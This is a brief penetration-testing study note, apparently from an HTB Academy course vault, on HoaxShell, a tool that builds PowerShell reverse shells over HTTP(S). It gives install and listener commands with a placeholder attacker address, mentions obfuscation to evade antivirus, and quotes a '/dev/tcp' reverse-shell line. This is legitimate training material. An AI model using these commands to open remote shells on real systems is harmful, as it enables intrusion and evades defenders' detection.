# HoaxShell

**Tags:** `#hoaxshell` `#reverseshell` `#windows` `#powershell` `#c2` `#avevasion`

Windows reverse-shell / lightweight C2 generator that tunnels the shell over **HTTP(S) with beaconing** instead of a raw TCP socket. Because the traffic looks like ordinary web requests (and can be HTTPS), it slips past host firewalls and some AV/EDR that flag classic `bash -i >& /dev/tcp/...` or Meterpreter TCP shells. Generates the PowerShell one-liner and runs the matching listener for you.

**Source:** https://github.com/t3l3machus/hoaxshell
**Install:** `git clone https://github.com/t3l3machus/hoaxshell && cd hoaxshell && pip3 install -r requirements.txt`

```bash
# Start the listener/generator (prints the PowerShell payload to run on the target)
sudo python3 hoaxshell.py -s <attacker_ip>

# HTTPS variant (self-signed) — payload and C2 both over TLS
sudo python3 hoaxshell.py -s <attacker_ip> -c <cert.pem> -k <key.pem>
# or generate a constrained/obfuscated payload for AV evasion (see -h for grabber/enc options)
```

Paste the generated one-liner into any PowerShell RCE on the target; the beacon connects back and you get an interactive prompt in the HoaxShell console.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]] (CPTS v2): reach for HoaxShell when a plain TCP reverse shell is blocked/detected and you need an HTTP(S)-based Windows shell.

---

*Created: 2026-08-21*
*Updated: 2026-08-21*
*Model: claude-opus-5*
